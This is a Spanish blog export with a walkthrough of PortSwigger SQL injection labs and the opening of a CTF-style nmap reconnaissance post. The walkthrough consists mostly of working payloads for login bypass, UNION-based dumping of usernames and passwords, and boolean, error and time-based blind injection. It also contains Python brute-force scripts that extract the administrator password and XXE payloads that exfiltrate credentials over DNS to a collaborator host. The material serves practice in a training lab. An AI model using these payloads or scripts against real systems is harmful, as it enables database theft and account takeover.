[{"content":" LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.\nLa pagina tramita por detras una peticion SQL que es la siguiente:\nSELECT * FROM products WHERE category = \u0026lsquo;Gifts\u0026rsquo; AND released =1;\nSELECT * FROM products WHERE category = \u0026lsquo;%s\u0026rsquo; AND released =1;\n| %s es el campo que tu puedes alterar |\nPor lo que muestra todos los datos de la tabla productos donde en la columna categoría valga Gifts y ademas tambien muetra aquellos que hayan sido publicados.\nExplotación: http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; or 1=1\u0026ndash; -\nLa consulta que se tramitaria por detras seria la siguiente:\nSELECT * FROM productos WHERE category = \u0026lsquo;Pets\u0026rsquo; or 1=1\u0026ndash; -\u0026rsquo; AND released=1;\nPor lo que como la validación de 1=1 es correcta va a coger todas las categorias existentes como validas y las va a mostar todas junto con los articulos no publicados.\nLAB 2: SQL injection vulnerability allowing login bypass El laboratorio tiene una vulnerabilidad de SQLi en el login de la pagina.\nLa query que puede esatr tramitando la pagina por detras podria ser algo así:\nSELECT nombre,apellido FROM users WHERE username = \u0026lsquo;administrator\u0026rsquo; AND password = \u0026lsquo;pass123\u0026rsquo;;\nSELECT nombre,apellido FROM users WHERE username = \u0026lsquo;%s\u0026rsquo; AND password = \u0026lsquo;%s\u0026rsquo;;\n| %s es el campo que tu puedes alterar |\nExplotación en el Login:\nUsername: administrator\u0026rsquo;\u0026ndash; -\nPassword: xxx\nLa consulta que se tramitaria por detras seria la siguiente:\nSELECT nombre,apellido FROM users WHERE username = \u0026lsquo;administrator\u0026rsquo;\u0026ndash; -\u0026rsquo; AND password = \u0026lsquo;xxx\u0026rsquo;;\nEsto sucede debido a que en esta consulta estamos comentando la parte de la contraseña por lo que no la tiene en cuenta a la hora de validar la consulta, y como el username de administrator existe la consulta es válida por lo que el login como administrador se puede llevar a cabo.\nLAB 3: SQL injection UNION attack, determining the number of columns returned by the query El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias.\nEn este caso primero vamos a averiguar cuantas columnas existen para la tabla en la que nos encontramos, para ello vamos a usar un order by y tartar de encontrar las columnas a base de prueba y error en la pagina de la siguiente manera. El order by depende de los campos que se engloben en el SELECT.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; order by 100\u0026ndash; -\nEsto provocara un error en la pagina, indicandonos que no es correcto.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; order by 3\u0026ndash; -\nAl comprobar que son 3 gracias a que la pagina lo interpreta como bueno y muestra contenido sin error la sieguiente parte es usar UNION SELECT para combinar datos.\nEn este caso usamos NULL ya que la web no nos permite ponerlo con numeros que se cambiarian por los NULLs de esta forma: union select 1,2,3\u0026ndash; -\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,NULL,NULL\u0026ndash; -\nLAB 4: SQL injection UNION attack, finding a columng containing text En este lab simplemente tenemos que hacer lo mismo pero esta vez queremos mostrar una cadena personalizada en la web gracias a los campos NULLs que tenemos. No todos los campos son inyectables, a veces hay que fuzzear y buscar de cual de ellos nos podemos aprovechar para sacar información de ellos.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,\u0026rsquo;texto\u0026rsquo;,NULL\u0026ndash; -\nEsto hará que en la respuesta del servidor veamos en la web la palabra texto que hemos definido arriba.\nLAB 5: SQL injection UNION attack, retriving data from other tables Este laboratorio trata de poder volcar información de otras tablas para poder conseguir datos del usuario administrador poder conectarnos como él.\nPrimero de todo vemos la cantidad de columnas que se tratan de golpe con el UNION SELECT saltándonos el paso del order by. http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select NULL,NULL\u0026ndash; -\nY comprobamos cual de estos dos campos es inyectable, ambos lo son, pero para practicar lo vamos a hacer solo con uno. http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select \u0026rsquo;test\u0026rsquo;,NULL\u0026ndash; -\nAhora vamos a comprobar las bases de datos existentes de la siguiente manera: http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select schema_name,NULL from information_schema.schemata\u0026ndash; -\nUna vez sabiendos las bases de datos procedemos a enumerar las tablas de la base de datos que seleccionemos. table_schema es para indicar el nombre de la base de datos http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select table_name,NULL from information_schema.tables where table_schema=\u0026lsquo;public\u0026rsquo;\u0026ndash; -\nAhora porcedemos a sacar las columnas de la base de datos public y de la tabla users: table_name es para indicar el nombre de la tabla. http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select column_name,NULL from information_schema.colums where table_schema=\u0026lsquo;public\u0026rsquo; and table_name=\u0026lsquo;users\u0026rsquo;\u0026ndash; -\nYa que tenemos todo lo necesario, podemos obtener los datos que estabamos buscando. group_concat() es para poder mostar ambos datos en una misma fila y poder verlos mejor representados. Tambien se puede con concat() http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select group_concat(username,\u0026rsquo;:\u0026rsquo;,password),NULL from users\u0026ndash; -\nSi la base de datos que está actualmente en uso no es la que contiene los datos que deseamos obtener es necesario que la indiquemos de la siguiente manera: poniendo la base de datos delante de la tabla y después un punto: public.users http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select group_concat(username,\u0026rsquo;:\u0026rsquo;,password),NULL from public.users\u0026ndash; -\nSi group_concat no funciona se pueden concatenar los datos de otra manera: http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select username||\u0026rsquo;:\u0026rsquo;||password,NULL from public.users\u0026ndash; -\nLAB 6: SQL injection UNION attack, retrieving multiple values in a single column En este caso queremos ver toda la información en una única columna, asique es prácticamente lo mismo que el laboratorio anterior.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select username||\u0026rsquo;:\u0026rsquo;||password,NULL from users\u0026ndash; -\nLAB 7: SQL injection attack, querying the database type and version on Oracle En este laboratorio se nos pide que saquemos solamente la informacion sobre la versión de Oracle\nEs necesario poner from dual ya que es una tabla especial que aparece en todas las bases de datos de oracle. Esto nos vale para comprobar si estamos trabajando con Oracle. http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories\u0026rsquo; union select NULL,NULL from dual\u0026ndash; -\nAhora que ya sabemos que estamos trabajando con Oracle porcedemos a sacar la version en la que se encuentra, para ellos es necesario poner SELECT banner FROM v\\$version o SELECT version FROM v$instance http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories\u0026rsquo; union select NULL,banner from v$version\u0026ndash; -\nLAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft En este caso es lo mismo que en el anterior. Sacar la version de una base de datos Mysql y Microsoft ya que en ambas se obtiene de la misma manera.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts\u0026rsquo; union select NULL,@@version\u0026ndash; -\nLAB 9: SQL injection attack, listing the database contents on non-Oracle databases En este laboratorio se nos pide básicamente los mismo que en uno de los anteriores, simplemente obtener la password del usuario administrator y conectarnos con su cuenta, para ello es necesario primero investigar y sacar la base de datos, tabla y columnas necesarias para obtener dicha password.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,NULL\u0026ndash; -\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select schema_name,NULL from information_schema.schemata\u0026ndash; -\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select table_name,NULL from information_schema.tables where table_schema=\u0026lsquo;public\u0026rsquo;\u0026ndash; -\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select column_name,NULL from information_schema.columns where table_schema=\u0026lsquo;public\u0026rsquo; and table_name=\u0026lsquo;nombre_tabla\u0026rsquo;\u0026ndash; -\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select username_xxx||\u0026rsquo;:\u0026rsquo;||password_xxx,NULL from users_xxx\u0026ndash; -\nLAB 10: SQL injection attack, listing the database contents on Oracle databases Este laboratorio consiste en los mismo que el anterior pero en este caso con una base de datos de Oracle, por lo que los pasos serán los mismos pero con una estructura un poco diferente.\nhttp://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,NULL from dual\u0026ndash; -\nDe esta forma vamos a mostrar todas las tablas de todas las bases de datos http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,table_name from all_tables\u0026ndash; -\nCon owners vamos a mostrar propietarios http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,owners from all_tables\u0026ndash; - De esta forma filtramos por las tablas del propietario que indiquemos http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,table_name from all_tables where owner=\u0026lsquo;nombre_del_propietario\u0026rsquo;\u0026ndash; -\nProsigamos con la obtención de las columnas de la siguiente manera: con all_tab_columns hacemos referencia a las columnas http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,column_name from all_tab_columns where table_name=\u0026lsquo;users_xxx\u0026rsquo;\u0026ndash; -\nY por últimos sacamos los datos username y password de la tabla users http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets\u0026rsquo; union select NULL,username_xxx||\u0026rsquo;:\u0026rsquo;||password_xxx from users_xxx\u0026ndash; -\nLAB 11: Blind SQL injection with conditional responses En este laboratorio el campo inyectable no es el de la categoría, es en la cookie, específicamente en TrackingId. Hay un campo que se muestra en la página como \u0026ldquo;Welcome back!\u0026rdquo;, pues este desaparece dependiendo de la inyección que hagamos, provocando que sepamos cual funciona y cual no dependiendo de si el mensaje de \u0026ldquo;Welcome back!\u0026rdquo; desaparece o no.\nPara este lab vamos a necesitar tirar de burpsuite para hacerlo de manera mas cómodo al principio y después poder hacer un script en python que lo automatice.\nPara entenderlo mejor vamos a hacer el ejemplo de la query que puede estar corriendo por detrás. SELECT * FROM products WHERE TrackingId = \u0026lsquo;xxxxxxxxx\u0026rsquo;;\nVamos a ir escalando gradualmente hasta tener la query que nos permita sacar la password el usuario administrador la cual usaremos en el script.\nPara comenzar lo que haremos será la siguiente(Todo esto en el campo de l coockie TrakingId): TrackingId=xxxxxxxxxxx' and (select 'a' from users where username='administrator')='a-- -\nAquí estamos filtrando por la letra \u0026lsquo;a\u0026rsquo; de administrator, como esta existe toda la query se va a convertir en una \u0026lsquo;a\u0026rsquo; por lo que va a quedar \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a y como esto es correcto vamos a ver el campo \u0026lsquo;Welcome back!\u0026rsquo; en la pagina lo que nos hará saber de que todo ha funcionado bien.\nTrackingId=xxxxxxxxxxx' and (select substring(username,1,1) from users where username='administrator')='a-- -\nCon esa query estamos haciendo prácticamente lo mismo, con substring lo que estamos haciendo es coger el primer carácter del campo username que en este caso estamos atentando directamente contra el \u0026lsquo;administrator\u0026rsquo;, y como este carácter es una \u0026lsquo;a\u0026rsquo; vamos a acabar teniendo el mimos resultado que en la query anterior: \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a. En esta query lo que podemos es ir iterando sobre el primer numero de la funcion substring y cambiar la letra de después del = para así ir practicando y viendo que es lo que sucede.\nPero nosotros lo que necesitamos es la contraseña ya que el usuario ya lo sabemos. Por lo que primero vamos a intentar averiguar cual es la longitud de la contraseña para así ir directos en la creación del script contra la longitud de caracteres que tiene la contraseña.\nTrackingId=xxxxxxxxxxx' and (select 'a' from users where username='administrator' and length(password)\u0026gt;=20)='a-- -\nCon length lo que vamos a hacer es poder saber la longitud del campo que introduzcamos dentro, a si que de esta manera si las dos condiciones se cumplen, la primera es como la del ejemplo que usamos antes y la segunda es comparando la longitud del campo password con un numero que nosotros pongamos iterando sobre él, hasta llegar a un numero donde no veamos el campo \u0026lsquo;Welcome back!\u0026rsquo; y así saber el limite de caracteres que tiene la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 from pwn import * import requests, signal, time, pdb, sys, string def def_handler(sig, frame): print(\u0026#34;\\n\\n[!] Saliendo...\\n\u0026#34;) sys.exit(1) # Ctrl+C signal.signal(signal.SIGINT, def_handler) main_url = \u0026#34;url de la web\u0026#34; characters = string.ascii_lowercase + string.digits def makeRequest(): password = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Fuerza bruta\u0026#34;) p1.status(\u0026#34;Iniciando ataque de fuerza bruta\u0026#34;) time.sleep(2) p2 = log.progress(\u0026#34;Password\u0026#34;) for position in range(1,21): # CANTIDA DE CARACTERES QUE TIENE LA PASSWORD for character in characters: cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#34;xxxxxxxxxxx\u0026#39; and (select substring(password,%d,1) from users where username=\u0026#39;administrator\u0026#39;)=\u0026#39;%s\u0026#34; % (position, character), \u0026#39;session\u0026#39; : \u0026#39;xxxxxxxxxxxxx\u0026#39;\t} p1.status(cookies[\u0026#39;TrackingID\u0026#39;]) r = requests.get(main_url, cookies=cookies) if \u0026#34;Welcome back!\u0026#34; in r.text: password += character p2.status(password) break if __name__ == \u0026#39;__main__\u0026#39;: makeRequest() LAB 12: Blind SQL injection with conditional errors En este laboratorio no vamos a ver mensajes de respuesta pero si vamos a ver códigos de estados como el 500 internal server error o el 200 ok. El camp inyectable es otra vez en la cookie, por lo que si tiramos de burpsuite será mas cómodo.\nSi probamos querys básicas que hemos estado utilizando durante todos los laboratorios de portswigger vamos a ver que a veces nos salta el 500 internal server error y otra el 200 ok. Esto nos puede descuadrar un poco, pero lo que tenemos que hacer es seguir probando y ver con que tipo de base de datos nos estamos topando(MySql, Microsoft, Oracle, etc).\nComo la query que se esta tratando por detrás es algo así: SELECT * FROM products WHERE TrackingId = \u0026lsquo;xxxxxxxxx\u0026rsquo;; Vamos a probar una manera de poder mandar la query correctamente, concatenado querys con los || como en uno de los laboratorios que hicimos anteriormente. SELECT * FROM products WHERE TrackingId = \u0026lsquo;xxxxxxxxx\u0026rsquo;||(select \u0026lsquo;\u0026rsquo;)||\u0026rsquo;\u0026rsquo;; De la siguiente manera vamos a ver que estamos tratando con una base de datos Oracle gracias a la tabla \u0026lsquo;dual\u0026rsquo;\nTrackingId = xxxxxxxxx'||(select '' from dual)||';\nAhora para poder ver si la tabla existe lo podemos comprobar de la siguiente manera. ROWNUM para quedarnos con una única fila en la respuesta:\nTrackingId = xxxxxxxxx'||(select '' from users where rownum=1)||';\nDe la siguiente manera vamos a crear una query en la que podamos generar el error 500 internal server error y el 200 ok a nuestro antojo y así aprovecharnos de eso para poder conseguir la contraseña. Pero antes de ir a por la contraseña vamos a ver un ejemplo de como se haría.\nTrackingId = xxxxxxxxx'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||';\nLa idea de esta query es generar un conflicto y poder ver el 500 internal server error. Para ello el \u0026ldquo;to_char(1/0)\u0026rdquo;, aunque también hay mas maneras de producirlo con esta misa query como veremos más adelante. Leemos la query de derecha a izquierda, así que como el usuario administrator\u0026rsquo; existe en la tabla users se procede a entrar en el case y se produce lo siguiente: si 1 es igual a 1 entonces hace la operatoria del \u0026rsquo;to_char()\u0026rsquo; y como da conflicto nos muestra el 500 internal server error, por lo que gracias a esto sabemos que el usuario administrador existe para la tabla users.\nAhora el caso opuesto para entenderlo mejor:\nTrackingId = xxxxxxxxx'||(select case when (2=1) then to_char(1/0) else '' end from users where username='administrator')||';\nAquí como 2 no es igual a 1 no va a entrar en la operatoria del \u0026rsquo;then to_char()\u0026rsquo;, sino que se va a ir al \u0026ldquo;else\u0026rsquo;\u0026rsquo;\u0026rdquo;, y como este no produce nada nos debería salir el 200 ok.\nEntonces imaginemos que ponemos como usuario uno que no exista, como por ejemplo \u0026lsquo;administrat\u0026rsquo;:\nTrackingId = xxxxxxxxx'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrat')||';\nPor tanto como el usuario no existe en esta tabla no procede a hacer toda la operatoria siguiente por lo que nos debería salir el 200 ok. A si que lo que nosotros estamos buscando desde un principio es ver el estado 500 no el 200, aunque también se puede de la otra manera\nEn este caso lo que vamos a tratar es buscar una manera de poder ir iterando sobre los caracteres de usuario estando ya filtrando por el usuario administrador. Por lo que el primer carácter es una \u0026lsquo;a\u0026rsquo; por lo que quedaría \u0026lsquo;a\u0026rsquo;=\u0026lsquo;a\u0026rsquo; y entonces se produciría el intencionado 500 internal server error.\nTrackingId = xxxxxxxxx'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||';\nPara sacar la contraseña es el mismo procedimiento pero en vez de sacar los caracteres para username los sacamos para password:\nTrackingId = xxxxxxxxx'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||';\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * import requests, signal, time, pdb, sys, string def def_handler(sig, frame): print(\u0026#34;\\n\\n[!] Saliendo...\\n\u0026#34;) sys.exit(1) # Ctrl+C signal.signal(signal.SIGINT, def_handler) main_url = \u0026#34;url de la web\u0026#34; characters = string.ascii_lowercase + string.digits def makeRequest(): password = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Fuerza bruta\u0026#34;) p1.status(\u0026#34;Iniciando ataque de fuerza bruta\u0026#34;) time.sleep(2) p2 = log.progress(\u0026#34;Password\u0026#34;) for position in range(1,21): # CANTIDA DE CARACTERES QUE TIENE LA PASSWORD for character in characters: cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#34;xxxxxxxxxxx\u0026#39;||(select case when substr(password,%d,1)=\u0026#39;%s\u0026#39; then to_char(1/0) else \u0026#39;\u0026#39; end from users where username=\u0026#39;administrator\u0026#39;)||\u0026#39;\u0026#34; % (position, character), \u0026#39;session\u0026#39; : \u0026#39;xxxxxxxxxxxxx\u0026#39;\t} p1.status(cookies[\u0026#39;TrackingID\u0026#39;]) r = requests.get(main_url, cookies=cookies) if r.status_code == 500: #CODIGO DE ESTADO password += character p2.status(password) break if __name__ == \u0026#39;__main__\u0026#39;: makeRequest() LAB 13: Blind SQL injection with time delays En este laboratorio hay que conseguir que la web tarde 10s en responder.En este caso vamos a estar tratando con una base de datos PostgresSQL.\nEl campo inyectable sigue siendo la cookie TrackingId, y ya no vamos a ver nada de respuesta ni errores que nos hagan ver si vamos por buen camino o no.\nLa forma en la que PostgresSQL de hacer que la web en este caso tarde 10s en responder seria de la siguiente manera:\nTrackingId = xxxxxxxxx'||pg_sleep(10)-- -;\nLAB 14: Blind SQL injection with time delays and information retrieval En este laboratorio vamos a tratar de sacar la contraseña del usuario administrador gracias al tiempo de respuesta de la web, como en el laboratorio anterior.\nLo que vamos a tratar de hacer con esta query es algo similar a la que hicimos en el Lab12, simplemente cuando una condición se cumpla con los filtro que apliquemos la respuesta del servidor será de 5s, de lo contrario la respuesta será inmediata.\nTrackingId = xxxxxxxxx'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -;\nAhora podríamos intentar averiguar de igual manera la longitud de la contraseña.\nTrackingId = xxxxxxxxx'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)\u0026gt;=20)-- -;\nLo siguiente ya seria sacar los caracteres que componen la contraseña con la función que hicimos antes pero en vez de ser \u0026lsquo;substr()\u0026rsquo; que es para ORACLE ahora usaremos \u0026lsquo;substring()\u0026rsquo;, en donde tendremos que ir iterando sobre el carácter \u0026lsquo;a\u0026rsquo; y sobre la posición para este carácter que en este caso sería \u0026lsquo;1\u0026rsquo;.\nTrackingId = xxxxxxxxx'||(select case when substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * import requests, signal, time, pdb, sys, string def def_handler(sig, frame): print(\u0026#34;\\n\\n[!] Saliendo...\\n\u0026#34;) sys.exit(1) # Ctrl+C signal.signal(signal.SIGINT, def_handler) main_url = \u0026#34;url de la web\u0026#34; characters = string.ascii_lowercase + string.digits def makeRequest(): password = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Fuerza bruta\u0026#34;) p1.status(\u0026#34;Iniciando ataque de fuerza bruta\u0026#34;) time.sleep(2) p2 = log.progress(\u0026#34;Password\u0026#34;) for position in range(1,21): # CANTIDA DE CARACTERES QUE TIENE LA PASSWORD for character in characters: cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#34;xxxxxxxxxxx\u0026#39;||(select case when substring(password,%d,1)=\u0026#39;%s\u0026#39; then pg_sleep(5) else pg_sleep(0) end from users where username=\u0026#39;administrator\u0026#39;)-- -\u0026#34; % (position, character), \u0026#39;session\u0026#39; : \u0026#39;xxxxxxxxxxxxx\u0026#39;\t} p1.status(cookies[\u0026#39;TrackingID\u0026#39;]) time_start = time.time() #Timepo de entrada que coja la hora actual antes de enviar los datos r = requests.get(main_url, cookies=cookies) time_end = time.time() #Tiempo de finalizacion despues de enviar los datos if time_end - time_start \u0026gt; 5: password += character p2.status(password) break if __name__ == \u0026#39;__main__\u0026#39;: makeRequest() LAB 15: Blind SQL injection with out-of-band interaction Suponiendo que es oracle\nEn este laboratorio hay que tratar de causar un DNS lookup con la herramienta Burp Collaborator.\nPara que esto se pueda acontecer hay que irse a la pestaña \u0026lsquo;Burp\u0026rsquo;-\u0026gt;\u0026lsquo;Burp collaborator client\u0026rsquo; le damos a copy to clipboard y después lo ponemos donde \u0026lsquo;burp-colaborator-subdomain\u0026rsquo;. y después urlencodearlo todo. ==TrackingId = xxxxxxxxx\u0026rsquo;||(SELECT EXTRACTVALUE(xmltype(\u0026rsquo;\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"\u003e %remote;]\u0026gt;\u0026rsquo;),\u0026rsquo;/l\u0026rsquo;) FROM dual)\u0026ndash; -==\nDespués mandamos la petición con el repeater y después volver a la pestaña de \u0026lsquo;Burp collaborator client\u0026rsquo; y darle a \u0026lsquo;pull now\u0026rsquo;, si vemos que hay una petición es que ha funcionado.\nLAB 16: Blind SQL injection with out-of-band data exfiltration Suponiendo que es Oracle.\nAquí es simplemente lo mismo, poner el subdominio de burp donde pone \u0026lsquo;burp-collaborator-subdomain\u0026rsquo; y delate de eso donde pone \u0026lsquo;select your query here\u0026rsquo; hay que poner la query que deseamos ejecutar para poder sacar datos como la contraseña del administrador. Y lo urlencodeamos.\nTrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026quot;http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\u0026quot;\u0026gt; %remote;]\u0026gt;'),'/l') FROM dual-- -\nPor ejemplo:\nTrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026quot;http://'||(select username form users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\u0026quot;\u0026gt; %remote;]\u0026gt;'),'/l') FROM dual-- -\nPor lo que en la respuesta vamos a ver la query seguido del subdominio de tal manera:\nadministrator.XXXXXXXXXXXXX.oastify.com\nPues el mismo caso pero para sacar la contraseña.\nTrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026quot;http://'||(select password form users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\u0026quot;\u0026gt; %remote;]\u0026gt;'),'/l') FROM dual-- -\nLo cual se representaria así:\n\u0026lsquo;resultadoDeLacontraseña\u0026rsquo;.XXXXXXXXXXXX.oastify.com\nLAB 17: SQL injection with filter bypass via XML enconding El objetivo de este laboratorio es bypassear el WAF que nos bloquea a la hora de hacer la inyección. Aquí la vulnerabilidad se encuentra en \u0026lsquo;stock check feature\u0026rsquo;. Para ese laboratorio vamos a necesitar el \u0026lsquo;HackVertor\u0026rsquo;, para ellos nos vamos a la pestaña extender y ahí buscamos esta extensión del burpsuite.\nEn el burpsuite veremos esta estructura XML:\n1 2 3 4 5 6 7 8 9 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; enconding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 2 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; A si que vamos a probar una inyección para ver que pasa.\n1 2 3 4 5 6 7 8 9 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; enconding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 2 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 union select NULL-- - \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; Y veremos en la respuesta que nos pone un \u0026ldquo;Attack detected\u0026rdquo;. Por lo que ahora vamos a tratar de bypassear el WAF con el \u0026ldquo;HackVertor\u0026rdquo;. Para ellos seleccionamos la línea donde hemos introducido la inyección y damos click derecho, después nos vamos a\n\u0026ldquo;Extensions\u0026rdquo;-\u0026gt;\u0026ldquo;HackVertor\u0026rdquo;-\u0026gt;\u0026ldquo;Encode\u0026rdquo;-\u0026gt;\u0026ldquo;hex-entities\u0026rdquo;. Esto se nos representara de la siguiente manera.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; enconding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 2 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; \u0026lt;@hex_entities\u0026gt; 1 union select NULL-- - \u0026lt;@/hex_entities\u0026gt; \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; Ahora veríamos que ya nos muestra el NULL en la respuesta, por lo que podemos ya tratar de obtener la contraseña del usuario administrador de la siguiente manera.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; enconding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 2 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; \u0026lt;@hex_entities\u0026gt; 1 union select password from users where username=\u0026#39;administrator\u0026#39;-- - \u0026lt;@/hex_entities\u0026gt; \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ","date":"2023-08-23T00:00:00Z","permalink":"/p/portswigger-sqli-labs/","title":"PortSwigger SQLi Labs"},{"content":"Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.\nParámetro → Descripción\n-p- → Escanea el rango completo de puertos(65535 puertos). \u0026ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. \u0026ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts. -oG → Guardar el output en formato grepeable. 1 2 3 4 5 6 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.212.220 -oG allports PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 3306/tcp open mysql syn-ack ttl 63 Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos.\nParámetro → Descripción\n-sC → Muestra todos los scripts relacionados con el servicio. -sV → Determina la version del servicio. -p → Escanea sobre los peurtos especificados. -oN → Guarda el output en un arcivo con formato normal. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 nmap -sCV -p22,80,3306 10.10.212.220 -oN targeted PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA) | 256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA) |_ 256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: 